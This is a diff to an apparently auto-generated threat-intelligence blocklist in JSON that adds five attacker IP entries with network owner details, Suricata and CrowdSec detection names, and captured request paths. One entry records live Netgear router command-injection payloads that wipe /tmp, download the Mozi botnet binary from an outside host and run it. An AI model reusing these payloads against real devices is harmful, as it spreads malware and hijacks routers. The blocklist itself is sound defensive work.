@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-09-18T01:00:00Z",
+  "generated_at": "2026-09-18T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 1116,
-    "v4": 1116,
+    "total": 1121,
+    "v4": 1121,
     "v6": 0
   },
   "items": [
@@ -18391,6 +18391,97 @@
       "payloads": [
         "POST /wp-json/batch/v1"
       ]
+    },
+    {
+      "ip": "103.116.137.186",
+      "family": "v4",
+      "first_seen": "2026-09-18T10:00:00Z",
+      "last_seen": "2026-09-18T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "134922",
+      "asn_name": "RGTECHNOSOLUTIONS-AS - R G TECHNOSOLUTIONS PVT LTD",
+      "asn_prefix": "103.116.136.0/23",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "93.152.221.108",
+      "family": "v4",
+      "first_seen": "2026-09-18T04:00:00Z",
+      "last_seen": "2026-09-18T04:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 21"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "197170",
+      "asn_name": "TECHTIES-AS TechTies Inc.",
+      "asn_prefix": "93.152.221.0/24"
+    },
+    {
+      "ip": "101.87.60.22",
+      "family": "v4",
+      "first_seen": "2026-09-18T01:00:00Z",
+      "last_seen": "2026-09-18T01:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WGET Command Specifying Output in HTTP Headers"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "4812",
+      "asn_name": "CHINANET-SH-AP - China Telecom (Group)",
+      "asn_prefix": "101.87.0.0/16",
+      "payloads": [
+        "POST /HNAP1/"
+      ]
+    },
+    {
+      "ip": "40.80.200.70",
+      "family": "v4",
+      "first_seen": "2026-09-18T01:00:00Z",
+      "last_seen": "2026-09-18T01:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "40.80.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /druid/index.html"
+      ]
+    },
+    {
+      "ip": "107.150.97.10",
+      "family": "v4",
+      "first_seen": "2026-09-18T11:00:00Z",
+      "last_seen": "2026-09-18T11:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 3"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "107.150.96.0/21"
     }
   ]
 }
